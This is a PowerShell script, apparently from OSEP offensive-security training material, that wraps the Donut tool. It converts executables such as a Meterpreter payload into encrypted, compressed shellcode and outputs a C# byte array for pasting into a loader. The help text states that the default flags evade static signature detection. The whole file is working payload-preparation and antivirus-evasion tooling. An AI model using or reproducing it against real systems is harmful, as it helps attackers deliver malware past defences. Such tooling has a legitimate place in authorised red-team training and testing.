<#
.SYNOPSIS
  Generates Donut shellcode from a PE/.NET assembly and outputs a C# byte array.

.DESCRIPTION
  Wraps donut.exe to convert any PE, .NET assembly, VBS, JS, or XSL file into position-
  independent shellcode. The output is a C# byte array ready to paste into a loader.

  Default flags for OSEP: -a 2 (x64), -f 1 (binary), -z 2 (aPLib compression),
  -e 3 (random names + Chaskey encryption). These evade static signature detection.

.EXAMPLE
  .\donut-wrapper.ps1 -InputFile meterpreter.exe -OutputFile shellcode.cs -Arch x64

.EXAMPLE
  .\donut-wrapper.ps1 -InputFile payload.exe -OutputFile shellcode.cs -Arch x64 -SkipCompression

.NOTES
  Requires: donut.exe in the same directory (or specify -DonutPath)
  Download: https://github.com/TheWover/Donut
#>
param(
    [Parameter(Mandatory=$true)][string]$InputFile,
    [Parameter(Mandatory=$true)][string]$OutputFile,
    [ValidateSet("x86","x64","both")][string]$Arch = "x64",
    [string]$DonutPath = ".\donut.exe",
    [switch]$SkipCompression,
    [switch]$SkipEncryption
)

$archFlag = switch ($Arch) { "x86" { 1 } "x64" { 2 } "both" { 3 } }
$compFlag = if ($SkipCompression) { 1 } else { 2 }   # 2 = aPLib (cross-platform)
$encFlag  = if ($SkipEncryption)  { 1 } else { 3 }   # 3 = random names + Chaskey

# Keep the binary file for potential aes-encrypt-shellcode.ps1 usage
$binFile = [IO.Path]::Combine([IO.Path]::GetTempPath(), "donut_$(Get-Random).bin")

if (-not (Test-Path $DonutPath)) { throw "donut.exe not found at: $DonutPath" }

& $DonutPath -i $InputFile -a $archFlag -f 1 -z $compFlag -e $encFlag -o $binFile

if (-not (Test-Path $binFile)) { throw "Donut failed to produce output" }

# Copy the binary next to the output file for aes-encrypt-shellcode.ps1 usage
$binOutputFile = [IO.Path]::ChangeExtension($OutputFile, ".bin")
Copy-Item $binFile $binOutputFile -Force
Write-Host "[+] Saved raw shellcode binary to: $binOutputFile"

$bytes = [IO.File]::ReadAllBytes($binFile)
$hex = ($bytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","

@"
// Generated by donut-wrapper.ps1
// Source: $InputFile
// Size: $($bytes.Length) bytes
private static readonly byte[] Shellcode = new byte[$($bytes.Length)] {
$hex
};
"@ | Set-Content -Path $OutputFile -Encoding ASCII

Remove-Item $binFile -Force -ErrorAction SilentlyContinue
Write-Host "[+] Wrote $($bytes.Length) bytes to $OutputFile"
Write-Host "[+] Raw shellcode binary saved to: $binOutputFile"